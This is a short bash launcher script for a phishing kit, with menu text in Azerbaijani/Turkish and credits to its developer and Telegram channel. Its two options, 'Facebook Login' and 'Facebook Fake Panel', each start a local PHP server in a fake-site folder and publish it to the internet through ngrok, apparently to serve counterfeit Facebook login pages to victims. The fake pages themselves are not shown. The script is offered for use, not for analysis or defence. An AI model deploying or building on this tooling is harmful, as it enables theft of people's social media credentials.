GNU nano 3.2                                                                        
start.sh

#!/bin/bash

#Developer:Nihat 「 FARZ 」
#İnstagram : @NihatFarz
#Telegram : NihatFarz
clear
echo -e  "


\e[35m     ((( Telegram  @MaragliWeb )))



\e[31m[01]\e[32m Facebook Login
\e[31m[02]\e[32m Facebook Fake Panel


\e[31m[00]\e[37m Menyu
\e[31m[99]\e[37m Çıxış
"
echo -e "\e[49m"
read -p "Seçim Edin: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Port Girin: " port
        echo -e "\e[32mCode: face01"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
        sleep 4
        cd Site-facebook/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 2 || $islem == 02 ]]; then
        read -p "Port Girin: " port
        echo -e "\e[32mCode: face02"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
        sleep 4
        cd Site-fakepanel/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 0 || $islem == 00 ]]; then
cd ..
cd ..
bash farz.sh
elif [[ $islem == 9 || $islem == 99 ]]; then
clear
echo -e "\e[31mKanalımızı İzləmədə qalın @MaragliWeb :)) ßß"
clear
sleep 1
exit 1
else
echo ""
echo -e "\e[31m Seçiminizi düzgün edin...."
sleep 3
clear
bash start.sh
fi
